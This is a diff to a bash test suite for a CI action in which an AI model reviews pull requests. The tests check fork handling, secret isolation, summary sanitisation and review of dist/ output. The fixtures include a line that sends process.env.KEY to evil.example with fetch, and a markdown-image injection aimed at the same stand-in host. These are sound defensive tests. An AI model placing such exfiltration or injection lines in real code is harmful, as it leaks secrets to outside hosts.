@@ -17,6 +17,7 @@ hasnt() { grep -qF -- "$2" "$1" && fail "$1 has [$2]"; }
 cat >"$T/claude" <<'STUB'
 #!/bin/bash
 printf '%s\n' "$@" >"$FAKE_DIR/args"
+env >"$FAKE_DIR/env"
 cat >"$FAKE_DIR/stdin"
 [ -f "$FAKE_DIR/broken" ] && exit 1
 node -e 'process.stdout.write(JSON.stringify({result: require("fs").readFileSync(process.argv[1], "utf8"), usage: {input_tokens: 5, output_tokens: 5}, total_cost_usd: 0.01}))' "$FAKE_DIR/answer"
@@ -42,7 +43,9 @@ printf '{"bases":["main"],"invariants":[{"paths":"^src/","rule":"RULE FROM PR"}]
 printf '#!/bin/sh\ntouch "%s/pwned"\n' "$T" >run-me.sh
 git add . && gitc commit -q -m pr && git push -q "$B" HEAD:refs/pull/7/head
 head=$(git rev-parse HEAD)
-event() { printf '{"pull_request":{"number":7,"title":"%s","base":{"ref":"main"},"head":{"sha":"%s"}}}\n' "$1" "$2" >"$T/event.json"; }
+event() { # title head-sha [head-repo]
+  printf '{"pull_request":{"number":7,"title":"%s","base":{"ref":"main","repo":{"full_name":"o/r"}},"head":{"sha":"%s","repo":{"full_name":"%s"}}}}\n' "$1" "$2" "${3:-o/r}" >"$T/event.json"
+}
 export GITHUB_EVENT_PATH="$T/event.json" OBJECTION_CI_REMOTE="$B" GITHUB_STEP_SUMMARY="$T/summary"
 cd "$T" || exit 1
 run() { rm -f "$T/summary" "$T/stdin" "$T/args"; bash "$CI" >"$T/out" 2>"$T/err"; }
@@ -152,6 +155,40 @@ has "$T/err" "the PR comment could not be posted"
 rm -f "$T/gh-calls"
 run
 [ -e "$T/gh-calls" ] && fail "a comment was posted without comment: true"
+# A fork's PR: not reviewed (and not passed) unless review-forks is on.
+event "Add x" "$head" "stranger/r"; answer
+rm -f "$T/stdin"
+run && fail "a fork's PR passed without a review"
+[ -e "$T/stdin" ] && fail "the accuser ran on a fork's PR"
+has "$T/summary" "not run on a fork's PR"
+OBJECTION_REVIEW_FORKS=true run || fail "review-forks: true did not review the fork's PR"
+event "Add x" "$head"
+# The reviewer sees neither the GitHub token nor the other runner's key.
+answer
+GITHUB_TOKEN=tok-x GEMINI_API_KEY=gem-x run
+grep -q 'tok-x' "$T/env" && fail "the reviewer saw GITHUB_TOKEN"
+grep -q 'gem-x' "$T/env" && fail "the claude reviewer saw GEMINI_API_KEY"
+# No findings table: not a review. "NO FINDINGS" is.
+printf 'I could not review this.\n' >"$T/answer"
+run && fail "an answer with no table passed"
+has "$T/summary" "no findings table"
+printf 'NO FINDINGS\n' >"$T/answer"
+run || fail "NO FINDINGS failed the review"
+# A diff cut for size fails, unless fail-on is none.
+answer
+OBJECTION_BRIEF_MAX_LINES=2 run && fail "a truncated diff passed"
+has "$T/summary" "too large for one review"
+OBJECTION_BRIEF_MAX_LINES=2 OBJECTION_FAIL_ON=none run || fail "fail-on none failed a truncated diff"
+# Model text cannot hide the rest of the summary or load an image.
+printf '| LOW | BUG | src/a.ts:3 | <!-- hide ![x](https://evil.example/q) | read | p |\n' >"$T/answer"
+run
+hasnt "$T/summary" "<!-- hide"
+hasnt "$T/summary" "![x]"
+# Only the bot's own marked comments are candidates for an edit.
+answer
+rm -f "$T/gh-calls"
+OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
+grep -q 'github-actions\[bot\]' "$T/gh-calls" || fail "the comment lookup does not filter on the bot"
 event "Add x" "0000000000000000000000000000000000000000"
 run && fail "a stale head passed"
 has "$T/err" "pushed again?"
@@ -174,6 +211,15 @@ event "Lock" "$(git -C "$W" rev-parse HEAD)"
 run || fail "a PR of excluded files failed ($(cat "$T/err"))"
 has "$T/summary" "nothing to review"
 [ -e "$T/stdin" ] && fail "the accuser ran on a PR of excluded files"
+# Build output is reviewed in CI: a PR that touches only dist/ is what a
+# JavaScript Action ships.
+cd "$W" && git checkout -q -b dist main 2>/dev/null || git checkout -q -b dist HEAD~1
+mkdir -p dist && printf 'fetch("https://evil.example/?k=" + process.env.KEY)\n' >dist/index.js && git add . && gitc commit -q -m dist &&
+  git push -q -f "$B" HEAD:refs/pull/7/head && cd "$T" || exit 1
+event "Dist" "$(git -C "$W" rev-parse HEAD)"; answer
+rm -f "$T/stdin"
+run
+has "$T/stdin" "dist/index.js"
 git -C "$B" update-ref -d refs/heads/main
 run && fail "a missing base passed"
 printf '{"push":{}}\n' >"$T/event.json"
